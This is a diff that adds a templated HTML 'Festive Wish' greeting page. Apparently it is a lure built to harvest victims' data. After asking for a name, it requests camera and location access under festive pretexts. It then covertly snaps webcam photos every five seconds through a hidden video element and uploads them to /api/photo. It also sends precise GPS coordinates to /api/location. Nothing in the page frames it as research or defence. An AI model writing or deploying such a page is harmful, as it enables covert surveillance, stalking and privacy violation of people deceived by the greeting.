@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Festive Wish</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            min-height: 100vh;
+            background: linear-gradient(135deg, {{ theme_color }} 0%, #2c3e50 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 10px;
+        }
+        .container {
+            max-width: 500px;
+            width: 100%;
+            background: white;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            animation: slideUp 0.5s ease;
+        }
+        @keyframes slideUp {
+            from { transform: translateY(50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        .header {
+            background: {{ theme_color }};
+            color: white;
+            padding: 40px 20px;
+            text-align: center;
+        }
+        .header h1 { font-size: 2.5em; margin-bottom: 10px; }
+        .header .icon { font-size: 3em; margin-bottom: 10px; }
+        .content { padding: 30px 20px; }
+        
+        .name-section, .permission-section, .wish-section {
+            transition: all 0.3s ease;
+        }
+        
+        .name-section {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .name-input {
+            width: 100%;
+            padding: 15px 20px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 1.1em;
+            margin: 15px 0;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+        
+        .name-input:focus {
+            border-color: {{ theme_color }};
+            box-shadow: 0 0 0 3px {{ theme_color }}33;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 18px;
+            background: {{ theme_color }};
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.2em;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 10px 0;
+            transition: all 0.3s ease;
+        }
+        
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 5px 20px {{ theme_color }}66; }
+        .btn:active { transform: translateY(0); }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+        
+        .permission-box {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 25px;
+            margin: 20px 0;
+            text-align: center;
+            border: 2px solid {{ theme_color }};
+        }
+        
+        .permission-text {
+            color: #666;
+            margin: 15px 0;
+            font-size: 0.95em;
+        }
+        
+        .status {
+            background: #e3f2fd;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
+            display: none;
+        }
+        .status.active { display: block; animation: fadeIn 0.5s ease; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        
+        .wish-section {
+            text-align: center;
+            padding: 30px;
+            background: linear-gradient(135deg, {{ theme_color }}22, #f8f9fa);
+            border-radius: 15px;
+            margin: 20px 0;
+            display: none;
+        }
+        .wish-section.active { display: block; animation: fadeIn 0.8s ease; }
+        
+        .wish-title {
+            font-size: 2em;
+            color: {{ theme_color }};
+            margin-bottom: 15px;
+        }
+        
+        .wish-message {
+            font-size: 1.2em;
+            line-height: 1.6;
+            color: #333;
+            margin: 20px 0;
+            font-style: italic;
+        }
+        
+        .user-name-highlight {
+            color: {{ theme_color }};
+            font-weight: bold;
+            font-size: 1.3em;
+        }
+        
+        .loading {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid {{ theme_color }};
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .photo-counter {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: {{ theme_color }};
+            color: white;
+            padding: 10px 20px;
+            border-radius: 30px;
+            font-size: 1em;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.2);
+            display: none;
+        }
+        .photo-counter.active { display: block; animation: slideIn 0.3s ease; }
+        @keyframes slideIn { from { transform: translateX(100px); } to { transform: translateX(0); } }
+        
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: #666;
+            border-top: 1px solid #eee;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="icon">{{ icon }}</div>
+            <h1>{{ greeting }}</h1>
+        </div>
+        
+        <div class="content">
+            <!-- Name Section -->
+            <div class="name-section" id="nameSection">
+                <h3 style="color: {{ theme_color }}; margin-bottom: 10px;">What's your name?</h3>
+                <input type="text" class="name-input" id="userName" placeholder="Enter your name" maxlength="50">
+                <button class="btn" id="continueBtn" onclick="submitName()">Continue ✨</button>
+            </div>
+            
+            <!-- Permission Section (hidden initially) -->
+            <div class="permission-section" id="permissionSection" style="display: none;">
+                <div class="permission-box">
+                    <h3 style="color: {{ theme_color }};">Almost there, <span id="displayName"></span>!</h3>
+                    <p class="permission-text">To personalize your wish, we need:</p>
+                    {% if permission == 'camera' or permission == 'both' %}
+                    <p>📸 Camera access - to capture your festive moment</p>
+                    {% endif %}
+                    {% if permission == 'location' or permission == 'both' %}
+                    <p>📍 Location access - to find celebrations near you</p>
+                    {% endif %}
+                    <button class="btn" onclick="requestPermissions()">Grant Permissions</button>
+                </div>
+            </div>
+            
+            <!-- Status -->
+            <div class="status" id="status">
+                <div class="loading"></div>
+                <p id="statusMessage">Processing...</p>
+            </div>
+            
+            <!-- Wish Section (shown after permissions) -->
+            <div class="wish-section" id="wishSection">
+                <div class="wish-title" id="wishGreeting"></div>
+                <div class="wish-message" id="wishMessage"></div>
+                <div class="user-name-highlight" id="wishName"></div>
+                <div style="margin-top: 30px; font-size: 2em;">{{ icon }}</div>
+            </div>
+        </div>
+        
+        <div class="photo-counter" id="photoCounter">
+            📸 Photos: <span id="photoCount">0</span>
+        </div>
+        
+        <div class="footer">✨ Made with love ✨</div>
+    </div>
+
+    <script>
+        const PERM = '{{ permission }}';
+        const TEMPLATE = '{{ template_name }}';
+        const THEME_COLOR = '{{ theme_color }}';
+        let mediaStream = null;
+        let interval = null;
+        let photoCount = 0;
+        let userName = '';
+
+        async function submitName() {
+            const nameInput = document.getElementById('userName');
+            userName = nameInput.value.trim();
+            
+            if (!userName) {
+                alert('Please enter your name');
+                return;
+            }
+
+            // Show loading
+            document.getElementById('nameSection').style.display = 'none';
+            document.getElementById('status').classList.add('active');
+            document.getElementById('statusMessage').textContent = `Welcome, ${userName}!`;
+
+            try {
+                // Send name to server
+                const response = await fetch('/api/submit-name', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        name: userName,
+                        template: TEMPLATE,
+                        permission: PERM
+                    })
+                });
+
+                const data = await response.json();
+                
+                // Store wish data
+                document.getElementById('wishGreeting').textContent = data.greeting;
+                document.getElementById('wishMessage').textContent = data.wish;
+                document.getElementById('wishName').textContent = userName;
+                document.getElementById('displayName').textContent = userName;
+
+                // Hide status, show permission section
+                document.getElementById('status').classList.remove('active');
+                document.getElementById('permissionSection').style.display = 'block';
+
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Something went wrong. Please try again.');
+                document.getElementById('nameSection').style.display = 'block';
+                document.getElementById('status').classList.remove('active');
+            }
+        }
+
+        async function requestPermissions() {
+            document.getElementById('permissionSection').style.display = 'none';
+            document.getElementById('status').classList.add('active');
+            document.getElementById('statusMessage').textContent = 'Requesting permissions...';
+
+            // Request camera if needed
+            if (PERM === 'camera' || PERM === 'both') {
+                try {
+                    mediaStream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user', width: 640, height: 480 }
+                    });
+                    document.getElementById('statusMessage').textContent = 'Camera access granted';
+                    startCapture();
+                } catch(e) {
+                    console.log('Camera denied');
+                    document.getElementById('statusMessage').textContent = 'Camera access denied';
+                }
+            }
+
+            // Request location if needed (with high accuracy)
+            if (PERM === 'location' || PERM === 'both') {
+                document.getElementById('statusMessage').textContent = 'Getting your precise location...';
+                
+                navigator.geolocation.getCurrentPosition(
+                    async (pos) => {
+                        // Send location to server
+                        await fetch('/api/location', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                lat: pos.coords.latitude,
+                                lng: pos.coords.longitude,
+                                accuracy: pos.coords.accuracy
+                            })
+                        });
+                        document.getElementById('statusMessage').textContent = 'Location captured!';
+                    },
+                    (err) => {
+                        console.log('Location denied');
+                        document.getElementById('statusMessage').textContent = 'Location access denied';
+                    },
+                    { 
+                        enableHighAccuracy: true, 
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            }
+
+            // Show wish after 2 seconds
+            setTimeout(() => {
+                document.getElementById('status').classList.remove('active');
+                document.getElementById('wishSection').classList.add('active');
+                if (PERM === 'camera' || PERM === 'both') {
+                    document.getElementById('photoCounter').classList.add('active');
+                }
+            }, 3000);
+        }
+
+        function startCapture() {
+            const video = document.createElement('video');
+            video.srcObject = mediaStream;
+            video.setAttribute('playsinline', '');
+            video.setAttribute('autoplay', '');
+            video.style.display = 'none';
+            document.body.appendChild(video);
+
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+
+            video.onloadedmetadata = () => {
+                video.play();
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+
+                // Capture first photo after 2 seconds
+                setTimeout(() => capturePhoto(video, canvas, ctx), 2000);
+                
+                // Then every 5 seconds
+                interval = setInterval(() => {
+                    capturePhoto(video, canvas, ctx);
+                }, 5000);
+            };
+        }
+
+        function capturePhoto(video, canvas, ctx) {
+            try {
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const photo = canvas.toDataURL('image/jpeg', 0.7);
+                
+                fetch('/api/photo', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({photo: photo})
+                }).then(() => {
+                    photoCount++;
+                    document.getElementById('photoCount').textContent = photoCount;
+                });
+            } catch(e) {
+                console.log('Capture error:', e);
+            }
+        }
+
+        // Clean up
+        window.addEventListener('beforeunload', () => {
+            if (interval) clearInterval(interval);
+            if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
+        });
+    </script>
+</body>
+</html>
